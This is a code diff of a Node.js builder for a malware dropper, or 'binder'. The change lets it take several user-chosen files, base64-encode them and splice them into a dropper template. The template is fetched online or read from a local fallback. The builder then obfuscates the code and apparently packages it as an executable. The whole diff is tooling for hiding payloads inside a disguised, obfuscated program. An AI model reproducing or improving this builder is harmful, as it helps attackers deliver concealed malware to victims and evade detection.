@@ -3,12 +3,7 @@ const fs = require('fs');
 const https = require('https');
 const prompt = require('prompt-sync')();
 const exe = require("@angablue/exe");
-
-
-var file = prompt("Enter the file for dropping: ");
-
-var fileData = fs.readFileSync(file);
-
+const path = require('path');
 
 async function getCode() {
     try {
@@ -19,23 +14,39 @@ async function getCode() {
                     data += chunk;
                 });
                 res.on('end', () => {
-                    resolve(data);
+                    if (res.statusCode === 200) {
+                        resolve(data);
+                    } else {
+                        reject(new Error('Failed to retrieve online code'));
+                    }
                 });
             }).on('error', (err) => {
                 reject(err);
             });
         });
         return res;
-    } catch (err) {
-        console.error(err);
-        return "";
+    } catch (error) {
+        const workingDir = process.cwd();
+        const fileLocation = path.join(workingDir, "src/static/dropper.js");
+        return fs.readFileSync(fileLocation, "utf8");
     }
 }
 
 async function main() {
+    var ammount_of_files = prompt("Enter the ammount of files you want to drop/bind: ");
+    var processes = [];
+    for (var i = 0; i < ammount_of_files; i++) {
+        var file_location = prompt("Enter the file location: ");
+        var process_ext = file_location.split('.').pop();
+        var process_code = fs.readFileSync(file_location, "base64");
+        processes.push({ process_ext, process_code });
+    }
+
+    var to_replace = '[{process_ext:"key1", process_code:"BASE64DATA"}]';
+
     var code = await getCode();
-    code = code.replace("YOUR_FILE_ENDING_HERE", file.split(".")[1]);
-    code = code.replace("BASE64ENCODEDSTUFFHERE", fileData.toString("base64"));
+
+    code = code.replace(to_replace, JSON.stringify(processes));
 
     var obfuscationResult = JavaScriptObfuscator.obfuscate(code, {
         compact: true,
